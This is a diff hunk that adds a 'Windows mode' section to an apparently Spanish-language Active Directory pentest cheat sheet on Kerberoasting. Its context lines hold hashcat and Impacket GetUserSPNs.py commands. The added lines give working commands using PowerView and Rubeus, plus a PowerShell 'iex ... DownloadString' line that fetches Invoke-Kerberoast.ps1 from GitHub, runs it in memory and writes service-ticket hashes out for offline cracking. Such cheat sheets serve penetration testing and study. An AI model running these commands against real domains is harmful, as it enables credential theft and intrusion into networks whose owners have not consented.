@@ -224,3 +224,12 @@ hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt
 *El objetivo de Kerberoasting es recopilar tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario en AD, no cuentas de computadora*
 
 `GetUserSPNs.py -request -dc-ip 10.10.10.18 -hashes <LMHASH>:<NTHASH> domain.htb/john -outputfile hashes.kerberoast` # Obtener TicketsGrantingServices
+ 
+ #### Windows mode
+
+`
+Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+`
